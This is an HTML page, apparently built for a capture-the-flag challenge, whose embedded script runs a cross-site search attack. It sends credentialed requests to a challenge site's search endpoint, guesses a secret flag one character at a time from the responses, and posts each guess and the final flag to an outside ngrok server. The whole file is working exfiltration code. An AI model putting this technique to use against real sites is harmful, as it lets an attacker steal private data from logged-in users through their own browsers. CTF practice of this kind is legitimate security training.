<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rubare Flag</title>
</head>
<body>
    <h1>Rubare la Flag dell'Architetto</h1>
    <script>
    const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag{';
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\';
    let currentFlag = 'flag{'; // Inizio della flag

    const logProgress = async (message) => {
    await fetch('https://bcc2-87-4-142-72.ngrok-free.app/log', {

        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `message=${encodeURIComponent(message)}`  // Updated to use 'message'
    });
    };


    const testChar = async (position) => {
        if (position < 100) { // Limite superiore
            for (let char of chars) {
                const query = `${baseUrl}${currentFlag}${char}`;
                const response = await fetch(query, {
                    method: 'GET',
                    credentials: 'include'
                });

                if (response.ok) {
                    await logProgress(`Trovato carattere ${char} per la posizione ${position}`);
                    console.log(`Trovato carattere ${char} per la posizione ${position}`);
                    currentFlag += char; // Aggiungi carattere
                    await testChar(currentFlag.length); // Prossima posizione
                    return; // Esci per evitare conflitti
                } else {
                    await logProgress(`Carattere ${char} non valido per la posizione ${position}`);
                    console.log(`Carattere ${char} non valido per la posizione ${position}`);
                }
            }
        } else {
            console.log(`Flag completa: ${currentFlag}`);
            // Invia la flag al tuo server Flask
            const response = await fetch('https://bcc2-87-4-142-72.ngrok-free.app/receive_flag', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `flag=${encodeURIComponent(currentFlag)}`
            });
            const data = await response.text();
            console.log(data);
        }
    };

    // Inizia il test
    testChar(currentFlag.length);
    </script>
</body>
</html>
